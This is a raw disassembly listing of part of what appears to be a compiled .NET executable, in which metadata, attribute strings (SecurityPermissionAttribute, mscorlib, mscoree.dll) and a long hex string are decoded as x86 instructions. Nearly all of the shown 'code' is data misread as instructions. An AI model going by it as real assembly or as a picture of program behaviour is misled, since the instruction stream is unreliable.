  40a06d:	xor    esi,DWORD PTR [ecx]
  40a06f:	cmp    DWORD PTR [esi],ebp
  40a071:	xor    DWORD PTR [edi],esi
  40a073:	cmp    DWORD PTR [edx],esi
  40a075:	cmp    DWORD PTR [eax],eax
  40a077:	add    BYTE PTR [ecx+eax*1],cl
  40a07a:	add    BYTE PTR [edi],al
  40a07c:	xor    al,0x2e
  40a07e:	xor    BYTE PTR [esi],ch
  40a080:	xor    BYTE PTR [esi],ch
  40a082:	xor    BYTE PTR [eax],al
  40a084:	add    BYTE PTR [edx],cl
  40a086:	add    DWORD PTR [eax],eax
  40a088:	add    eax,0x552d6e65
  40a08d:	push   ebx
  40a08e:	add    BYTE PTR [eax],al
  40a090:	sub    eax,0x66280001
  40a095:	cmp    bl,BYTE PTR [esp+eiz*2+0x64]
  40a099:	pop    esp
  40a09a:	je     0x40a10b
  40a09c:	outs   dx,DWORD PTR ds:[esi]
  40a09d:	ins    BYTE PTR es:[edi],dx
  40a09e:	jae    0x40a0fc
  40a0a0:	fs gs jbe 0x40a108
  40a0a4:	imul   esi,DWORD PTR [esi+0x5c],0x534d3533
  40a0ab:	push   ebx
  40a0ac:	push   0x64657261
  40a0b1:	dec    esp
  40a0b2:	imul   esp,DWORD PTR [edx+0x31],0x2e343230
  40a0b9:	jae    0x40a129
  40a0bb:	imul   eax,DWORD PTR [eax],0x0
  40a0be:	or     DWORD PTR [eax+0x1],0x0
  40a0c2:	add    BYTE PTR [eax+0x30],0x30
  40a0c6:	xor    dh,BYTE PTR [eax+esi*1]
  40a0c9:	xor    BYTE PTR [eax],dh
  40a0cb:	xor    BYTE PTR [eax],dh
  40a0cd:	arpl   WORD PTR [eax],di
  40a0cf:	xor    BYTE PTR [eax],dh
  40a0d1:	xor    BYTE PTR [eax],dh
  40a0d3:	xor    BYTE PTR [ecx],dh
  40a0d5:	xor    al,0x30
  40a0d7:	xor    DWORD PTR [eax],esi
  40a0d9:	xor    BYTE PTR [eax],dh
  40a0db:	xor    BYTE PTR [eax],dh
  40a0dd:	xor    BYTE PTR ss:[edx],dh
  40a0e0:	xor    BYTE PTR [eax],dh
  40a0e2:	xor    BYTE PTR [eax],dh
  40a0e4:	xor    BYTE PTR [eax],dh
  40a0e6:	xor    dh,BYTE PTR [eax+esi*1]
  40a0e9:	xor    BYTE PTR [eax],dh
  40a0eb:	xor    BYTE PTR ds:0x34333532,dh
  40a0f1:	xor    DWORD PTR [ebx],esi
  40a0f3:	xor    DWORD PTR [eax],esi
  40a0f5:	xor    BYTE PTR [eax],dh
  40a0f7:	cmp    BYTE PTR [eax],dh
  40a0f9:	xor    BYTE PTR [eax],dh
  40a0fb:	xor    BYTE PTR [eax],dh
  40a0fd:	xor    DWORD PTR [eax],esi
  40a0ff:	xor    BYTE PTR [eax],dh
  40a101:	xor    DWORD PTR [eax],esi
  40a103:	xor    BYTE PTR [eax],bh
  40a105:	xor    eax,0x30646161
  40a10a:	bound  esp,QWORD PTR [ebp+0x66]
  40a10d:	xor    BYTE PTR [esi],dh
  40a10f:	cmp    BYTE PTR [eax],bh
  40a111:	xor    DWORD PTR fs:[edx+0x39],esp
  40a115:	cmp    DWORD PTR [ecx+eiz*2],esi
  40a118:	xor    BYTE PTR [edi+esi*1+0x38],ah
  40a11c:	xor    DWORD PTR gs:[esi+0x64],esp
  40a120:	xor    bh,BYTE PTR [ecx]
  40a122:	data16 arpl WORD PTR [edx],si
  40a125:	xor    al,0x61
  40a127:	arpl   WORD PTR [ebx],si
  40a129:	xor    al,0x65
  40a12b:	xor    esp,DWORD PTR fs:[ebx+esi*1+0x61]
  40a130:	arpl   WORD PTR [ebx],si
  40a132:	bound  di,DWORD PTR [ecx]
  40a135:	bound  esi,QWORD PTR [ebx]
  40a137:	xor    BYTE PTR fs:[ebx+0x34],ah
  40a13b:	cmp    BYTE PTR [ebx],dh
  40a13d:	cmp    BYTE PTR [esi],dh
  40a13f:	bound  esp,QWORD PTR [ecx+0x38]
  40a142:	xor    esi,DWORD PTR [ecx+eiz*2]
  40a145:	popa   
  40a146:	cmp    BYTE PTR [eax],bh
  40a148:	xor    BYTE PTR [eax],dh
  40a14a:	xor    esi,DWORD PTR ds:0x61303630
  40a150:	cmp    BYTE PTR [eax],bh
  40a152:	xor    al,0x38
  40a154:	bound  esi,QWORD PTR [edx]
  40a156:	cmp    BYTE PTR fs:[ecx+0x64],ah
  40a15a:	xor    ax,0x6538
  40a15e:	ss aaa 
  40a160:	xor    BYTE PTR [ebp+0x64],ah
  40a163:	xor    dh,BYTE PTR [eax]
  40a165:	cmp    DWORD PTR [ecx],esi
  40a167:	xor    al,0x62
  40a169:	xor    esi,DWORD PTR gs:[esi]
  40a16c:	cmp    BYTE PTR [ecx],dh
  40a16e:	popa   
  40a16f:	cmp    BYTE PTR [ecx],bh
  40a171:	xor    DWORD PTR [ebx+0x39],esp
  40a174:	arpl   WORD PTR [eax],di
  40a176:	arpl   WORD PTR [eax],si
  40a178:	xor    DWORD PTR [ebp+0x65],esp
  40a17b:	data16 xor ah,BYTE PTR [ecx+0x62]
  40a17f:	xor    dh,BYTE PTR [edx]
  40a181:	cmp    BYTE PTR [edi],dh
  40a183:	xor    dh,BYTE PTR ds:0x33633734
  40a189:	cmp    DWORD PTR [edx+0x65],esp
  40a18c:	xor    BYTE PTR [eax],dh
  40a18e:	popa   
  40a18f:	data16 xor BYTE PTR [ebp+0x36],ah
  40a193:	arpl   WORD PTR [edi],si
  40a195:	xor    dh,BYTE PTR [eax+edi*1]
  40a198:	xor    eax,0x66633764
  40a19d:	xor    DWORD PTR fs:[ecx+0x35],esp
  40a1a1:	xor    DWORD PTR [esi+eiz*2+0x38],esp
  40a1a5:	cmp    DWORD PTR [edi+esi*1],esi
  40a1a8:	xor    esi,DWORD PTR fs:[esi]
  40a1ab:	arpl   WORD PTR [ebp+0x62],sp
  40a1ae:	popa   
  40a1af:	cmp    DWORD PTR [ecx],edi
  40a1b1:	cmp    BYTE PTR [ecx],bh
  40a1b3:	xor    DWORD PTR [eax],esi
  40a1b5:	bound  esi,QWORD PTR ss:0x65626138
  40a1bc:	aaa    
  40a1bd:	cmp    DWORD PTR [ebp+0x36],esp
  40a1c0:	popa   
  40a1c1:	xor    esp,DWORD PTR [ebp+0x37]
  40a1c4:	xor    DWORD PTR [ecx+0x30],esp
  40a1c7:	xor    DWORD PTR [ebp+0x64],esp
  40a1ca:	bound  esp,QWORD PTR ss:[ebx+eiz*2+0x38]
  40a1cf:	ss aaa 
  40a1d1:	xor    BYTE PTR [ecx],dh
  40a1d3:	xor    bh,BYTE PTR [eax]
  40a1d5:	cmp    BYTE PTR [ebx],dh
  40a1d7:	xor    BYTE PTR gs:[edx+0x31],ah
  40a1db:	popa   
  40a1dc:	xor    al,0x64
  40a1de:	xor    esi,DWORD PTR ds:0x35623162
  40a1e4:	gs gs gs fs ss data16 xor dh,BYTE PTR fs:[ecx]
  40a1ed:	gs xor al,0x30
  40a1f0:	xor    DWORD PTR [edx+0x62],esp
  40a1f3:	xor    BYTE PTR [ebx+0x32],ah
  40a1f6:	xor    ah,BYTE PTR [esi+0x32]
  40a1f9:	xor    dh,BYTE PTR [esi+esi*1]
  40a1fc:	arpl   WORD PTR [ebx+0x62],sp
  40a1ff:	cmp    DWORD PTR ss:[ecx],edi
  40a202:	aaa    
  40a203:	cmp    DWORD PTR [ebx+eiz*2+0x39],esp
  40a207:	gs xor DWORD PTR ss:[ebp+0x65],esp
  40a20c:	data16 xor dh,BYTE PTR [esi]
  40a20f:	xor    bh,BYTE PTR [eax]
  40a211:	xor    esi,DWORD PTR [edx]
  40a213:	gs xor BYTE PTR fs:[esi+0x32],ah
  40a218:	xor    BYTE PTR [esi],dh
  40a21a:	xor    al,0x38
  40a21c:	xor    eax,0x35323733
  40a221:	popa   
  40a222:	aaa    
  40a223:	xor    eax,0x66353834
  40a228:	popa   
  40a229:	cmp    BYTE PTR [ecx+0x33],ah
  40a22c:	bound  si,DWORD PTR gs:[edi]
  40a230:	xor    BYTE PTR gs:[edx],dh
  40a233:	aaa    
  40a234:	xor    esi,DWORD PTR [ecx]
  40a236:	cmp    DWORD PTR [ebx+0x38],esp
  40a239:	ss fs arpl WORD PTR gs:[eax],si
  40a23e:	xor    esp,DWORD PTR [ebx+eiz*2+0x33]
  40a242:	bound  esi,QWORD PTR [ecx]
  40a244:	bound  esp,QWORD PTR [ebx+0x61]
  40a247:	xor    ah,BYTE PTR [edx+0x35]
  40a24a:	xor    BYTE PTR [eax],bh
  40a24c:	xor    DWORD PTR [edx+0x61],esp
  40a24f:	bound  esi,QWORD PTR ds:0x32366132
  40a255:	aaa    
  40a256:	bound  edi,QWORD PTR [ecx]
  40a258:	cmp    DWORD PTR [ecx],esi
  40a25a:	aaa    
  40a25b:	xor    al,0x35
  40a25d:	xor    BYTE PTR [esi+eiz*2+0x61],ah
  40a261:	fs xor eax,0x39373433
  40a267:	cmp    DWORD PTR [ebp+0x31],esp
  40a26a:	arpl   WORD PTR [edi],si
  40a26c:	popa   
  40a26d:	xor    ax,0x3638
  40a271:	cmp    BYTE PTR [ebx],dh
  40a273:	bound  esp,QWORD PTR [esi+eiz*2+0x61]
  40a277:	xor    DWORD PTR [ebx],esi
  40a279:	xor    eax,0x31353166
  40a27e:	cmp    BYTE PTR [esi+0x66],ah
  40a281:	xor    DWORD PTR [ebp+0x61],esp
  40a284:	xor    BYTE PTR ss:[ebp+0x39],ah
  40a288:	xor    BYTE PTR [edi+esi*1+0x62],ah
  40a28c:	cmp    DWORD PTR [ecx],edi
  40a28e:	xor    esp,DWORD PTR [ecx+0x36]
  40a291:	arpl   WORD PTR [eax],di
  40a293:	aaa    
  40a294:	xor    sp,WORD PTR fs:[esp+eiz*2+0x39]
  40a29a:	xor    esi,DWORD PTR [eax+esi*1]
  40a29d:	cmp    BYTE PTR [ebp+0x33],ah
  40a2a0:	xor    eax,0x39323164
  40a2a5:	cmp    WORD PTR ss:[ecx+0x37],sp
  40a2aa:	cmp    WORD PTR [ecx+0x39],sp
  40a2ae:	aaa    
  40a2af:	arpl   WORD PTR ds:0x36356264,si
  40a2b5:	arpl   WORD PTR [eax],si
  40a2b7:	xor    sp,WORD PTR [ebx+0x63]
  40a2bb:	xor    dh,BYTE PTR ds:0x31316461
  40a2c1:	cmp    DWORD PTR gs:[edi],esi
  40a2c4:	aaa    
  40a2c5:	aaa    
  40a2c6:	cmp    WORD PTR [esp+eiz*2],si
  40a2ca:	xor    DWORD PTR [ebx],esi
  40a2cc:	cmp    BYTE PTR [edx+0x33],ah
  40a2cf:	arpl   WORD PTR [ebp+0x61],sp
  40a2d2:	xor    eax,0x61396233
  40a2d7:	cmp    BYTE PTR [ebx],dh
  40a2d9:	xor    esi,DWORD PTR [ecx]
  40a2db:	arpl   WORD PTR [edx],si
  40a2dd:	gs ss arpl WORD PTR fs:[edx+0x38],sp
  40a2e3:	xor    ah,BYTE PTR fs:[ebp+0x61]
  40a2e7:	cmp    DWORD PTR [eiz*2+0x66623831],esi
  40a2ee:	xor    DWORD PTR [ecx],esi
  40a2f0:	xor    esp,DWORD PTR ss:[esi+0x66]
  40a2f4:	xor    DWORD PTR [ecx],esi
  40a2f6:	xor    ah,BYTE PTR [ecx+0x32]
  40a2f9:	xor    ah,BYTE PTR [edx+eiz*2+0x64]
  40a2fd:	cmp    DWORD PTR [edx],esi
  40a2ff:	fs xor al,0x32
  40a302:	cmp    DWORD PTR [ecx-0x7f],esp
  40a305:	add    BYTE PTR [eax],bh
  40a307:	cmp    DWORD PTR [ecx],esi
  40a309:	xor    esp,DWORD PTR [ebp+0x66]
  40a30c:	cmp    BYTE PTR [esi],dh
  40a30e:	cmp    DWORD PTR [esi],esi
  40a310:	xor    al,0x36
  40a312:	xor    DWORD PTR fs:[ecx+edi*1],esi
  40a316:	aaa    
  40a317:	xor    DWORD PTR [esi+eiz*2+0x32],esp
  40a31b:	xor    dh,BYTE PTR [edx]
  40a31d:	arpl   WORD PTR [edx],si
  40a31f:	xor    DWORD PTR [eax],esi
  40a321:	xor    BYTE PTR [ecx],dh
  40a323:	cmp    BYTE PTR [ecx+0x62],ah
  40a326:	xor    edi,DWORD PTR [ecx]
  40a328:	xor    al,0x63
  40a32a:	gs xor sp,WORD PTR ss:[esi+0x38]
  40a330:	bound  edi,QWORD PTR gs:[ecx]
  40a333:	bound  esi,QWORD PTR [esp+eiz*2]
  40a336:	cmp    BYTE PTR [ecx],bh
  40a338:	xor    al,0x63
  40a33a:	xor    BYTE PTR [esp+eiz*2+0x61],ah
  40a33e:	aaa    
  40a33f:	xor    esi,DWORD PTR [esi]
  40a341:	cmp    BYTE PTR [ebx+0x66],ah
  40a344:	bound  esi,QWORD PTR [esi]
  40a346:	cmp    DWORD PTR [esi+eiz*2+0x31],esp
  40a34a:	xor    eax,0x39343064
  40a34f:	bound  esi,QWORD PTR [ebx]
  40a351:	xor    al,0x37
  40a353:	data16 cmp BYTE PTR [ecx+0x38],ah
  40a357:	bound  edi,QWORD PTR [ecx]
  40a359:	xor    dh,BYTE PTR [eax]
  40a35b:	xor    eax,0x63636463
  40a360:	xor    esp,DWORD PTR [esi+esi*1+0x62]
  40a364:	fs ss cmp DWORD PTR ss:[eax],esi
  40a369:	data16 xor BYTE PTR [edx+0x64],ah
  40a36d:	xor    dh,BYTE PTR [edx+eiz*2]
  40a370:	xor    esp,DWORD PTR [ecx+eiz*2+0x33]
  40a374:	xor    DWORD PTR [edi],esi
  40a376:	cmp    DWORD PTR [esi+0x65],esp
  40a379:	bound  edi,QWORD PTR [eax]
  40a37b:	arpl   WORD PTR [eax],si
  40a37d:	xor    esp,DWORD PTR [esi+0x34]
  40a380:	xor    DWORD PTR [eax],esi
  40a382:	aaa    
  40a383:	xor    BYTE PTR [ebx],dh
  40a385:	xor    BYTE PTR [edx],dh
  40a387:	aaa    
  40a388:	arpl   WORD PTR [edi],si
  40a38a:	cmp    BYTE PTR [esp+esi*1],dh
  40a38d:	data16 ss xor ax,0x3934
  40a393:	cmp    DWORD PTR [edi],esi
  40a395:	xor    edi,DWORD PTR gs:[eax]
  40a398:	xor    BYTE PTR [ecx],dh
  40a39a:	xor    eax,0x39636664
  40a39f:	aaa    
  40a3a0:	xor    dh,BYTE PTR [edx]
  40a3a2:	xor    ah,BYTE PTR [ebx+0x31]
  40a3a5:	xor    eax,0x61313630
  40a3aa:	data16 xor ah,BYTE PTR [ecx+0x31]
  40a3ae:	xor    esp,DWORD PTR fs:[esi+0x65]
  40a3b2:	cmp    DWORD PTR [ecx],esi
  40a3b4:	aaa    
  40a3b5:	aaa    
  40a3b6:	xor    eax,0x64643962
  40a3bb:	xor    al,0x62
  40a3bd:	cmp    BYTE PTR [ebp+0x64],ah
  40a3c0:	gs ss xor al,0x64
  40a3c4:	xor    esp,DWORD PTR [ebp+esi*1+0x39]
  40a3c8:	cmp    BYTE PTR [ecx],dh
  40a3ca:	xor    dh,BYTE PTR ss:[edi]
  40a3cd:	xor    BYTE PTR [ecx+0x39],ah
  40a3d0:	xor    eax,0x33653032
  40a3d5:	cmp    DWORD PTR [ebx],esi
  40a3d7:	arpl   WORD PTR [eax],di
  40a3d9:	gs xor BYTE PTR ss:[esi],dh
  40a3dd:	xor    DWORD PTR [ecx],edi
  40a3df:	bound  edi,QWORD PTR [eax]
  40a3e1:	xor    BYTE PTR [esp+esi*1+0x30],ah
  40a3e5:	data16 arpl WORD PTR [ecx],si
  40a3e8:	arpl   WORD PTR fs:[esi+eiz*2],si
  40a3ec:	xor    DWORD PTR [edx],esi
  40a3ee:	bound  esi,QWORD PTR ds:0x63306161
  40a3f4:	xor    ah,BYTE PTR [esi+eiz*2+0x32]
  40a3f8:	xor    BYTE PTR [eax+esi*1+0x32],ah
  40a3fc:	gs popa 
  40a3fe:	xor    esi,DWORD PTR [edx]
  40a400:	cmp    DWORD PTR [esi],esi
  40a402:	xor    BYTE PTR [eax],bh
  40a404:	xor    eax,0x1e000031
  40a409:	add    DWORD PTR [eax],eax
  40a40b:	add    DWORD PTR [eax],eax
  40a40d:	push   esp
  40a40e:	add    dl,BYTE PTR [esi]
  40a410:	push   edi
  40a411:	jb     0x40a474
  40a413:	jo     0x40a463
  40a415:	outs   dx,DWORD PTR ds:[esi]
  40a416:	outs   dx,BYTE PTR ds:[esi]
  40a417:	inc    ebp
  40a418:	js     0x40a47d
  40a41a:	gs jo  0x40a491
  40a41d:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  40a424:	ja     0x40a499
  40a426:	add    DWORD PTR [eax],ecx
  40a428:	add    DWORD PTR [eax],eax
  40a42a:	or     BYTE PTR [eax],al
  40a42c:	add    BYTE PTR [eax],al
  40a42e:	add    BYTE PTR [eax],al
  40a430:	sbb    BYTE PTR [eax-0x7d7ffed2],0x53
  40a437:	jns    0x40a4ac
  40a439:	je     0x40a4a0
  40a43b:	ins    DWORD PTR es:[edi],dx
  40a43c:	cs push ebx
  40a43e:	arpl   WORD PTR gs:[ebp+0x72],si
  40a442:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  40a44a:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  40a451:	cs inc esi
  40a453:	imul   ebp,DWORD PTR [ebp+eiz*2+0x49],0x7265504f
  40a45b:	ins    DWORD PTR es:[edi],dx
  40a45c:	imul   esi,DWORD PTR [ebx+0x73],0x416e6f69
  40a463:	je     0x40a4d9
  40a465:	jb     0x40a4d0
  40a467:	bound  esi,QWORD PTR [ebp+0x74]
  40a46a:	gs sub al,0x20
  40a46d:	ins    DWORD PTR es:[edi],dx
  40a46e:	jae    0x40a4d3
  40a470:	outs   dx,DWORD PTR ds:[esi]
  40a471:	jb     0x40a4df
  40a473:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  40a47a:	jae    0x40a4e5
  40a47c:	outs   dx,DWORD PTR ds:[esi]
  40a47d:	outs   dx,BYTE PTR ds:[esi]
  40a47e:	cmp    eax,0x2e302e34
  40a483:	xor    BYTE PTR [esi],ch
  40a485:	xor    BYTE PTR [eax+eiz*1],ch
  40a488:	inc    ebx
  40a489:	jne    0x40a4f7
  40a48b:	je     0x40a502
  40a48d:	jb     0x40a4f4
  40a48f:	cmp    eax,0x7475656e
  40a494:	jb     0x40a4f7
  40a496:	ins    BYTE PTR es:[edi],dx
  40a497:	sub    al,0x20
  40a499:	push   eax
  40a49a:	jne    0x40a4fe
  40a49c:	ins    BYTE PTR es:[edi],dx
  40a49d:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  40a4a4:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  40a4a8:	bound  esi,QWORD PTR [edi]
  40a4aa:	aaa    
  40a4ab:	popa   
  40a4ac:	xor    eax,0x31363563
  40a4b1:	cmp    DWORD PTR [ebx],esi
  40a4b3:	xor    al,0x65
  40a4b5:	xor    BYTE PTR [eax],bh
  40a4b7:	cmp    DWORD PTR [ecx],edx
  40a4b9:	add    DWORD PTR [edx+eax*1+0xc],edx
  40a4bd:	push   ebp
  40a4be:	outs   dx,BYTE PTR ds:[esi]
  40a4bf:	jb     0x40a526
  40a4c1:	jae    0x40a537
  40a4c3:	jb     0x40a52e
  40a4c5:	arpl   WORD PTR [ebp+eiz*2+0x64],si
  40a4c9:	add    DWORD PTR [eax],eax
  40a4cb:	add    BYTE PTR [eax],al
  40a4cd:	add    BYTE PTR [eax],al
  40a4cf:	add    BYTE PTR [edx+0x4ffa80],cl
  40a4d5:	add    BYTE PTR [eax],al
  40a4d7:	add    BYTE PTR [edx],al
  40a4d9:	add    BYTE PTR [eax],al
  40a4db:	add    BYTE PTR [eax],ah
  40a4dd:	add    BYTE PTR [eax],al
  40a4df:	add    al,ch
  40a4e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4e2:	add    BYTE PTR [eax],al
  40a4e4:	call   0x5240a56f
  40a4e9:	push   ebx
  40a4ea:	inc    esp
  40a4eb:	push   ebx
  40a4ec:	pop    edi
  40a4ed:	sbb    edx,edi
  40a4ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4f0:	jne    0x40a4ca
  40a4f2:	jmp    0x40a542
  40a4f4:	popf   
  40a4f5:	or     ebp,DWORD PTR [esi-0x18]
  40a4f8:	dec    edx
  40a4f9:	adc    al,al
  40a4fb:	scas   al,BYTE PTR es:[edi]
  40a4fc:	add    DWORD PTR [eax],eax
  40a4fe:	add    BYTE PTR [eax],al
  40a500:	ja     0x40a565
  40a502:	popa   
  40a503:	cs jo  0x40a56a
  40a506:	bound  eax,QWORD PTR [eax]
	...
  40a604:	sub    al,0xa6
	...
  40a60e:	add    BYTE PTR [eax],al
  40a610:	dec    esi
  40a611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a612:	add    BYTE PTR [eax],al
  40a614:	add    BYTE PTR [eax],ah
	...
  40a62a:	add    BYTE PTR [eax],al
  40a62c:	inc    eax
  40a62d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  40a642:	pop    edi
  40a643:	inc    ebx
  40a644:	outs   dx,DWORD PTR ds:[esi]
  40a645:	jb     0x40a68c
  40a647:	js     0x40a6ae
  40a649:	dec    ebp
  40a64a:	popa   
  40a64b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  40a652:	jb     0x40a6b9
  40a654:	gs cs fs ins BYTE PTR es:[edi],dx
  40a658:	ins    BYTE PTR es:[edi],dx
  40a659:	add    BYTE PTR [eax],al
  40a65b:	add    BYTE PTR [eax],al
  40a65d:	add    bh,bh
  40a65f:	and    eax,0x402000
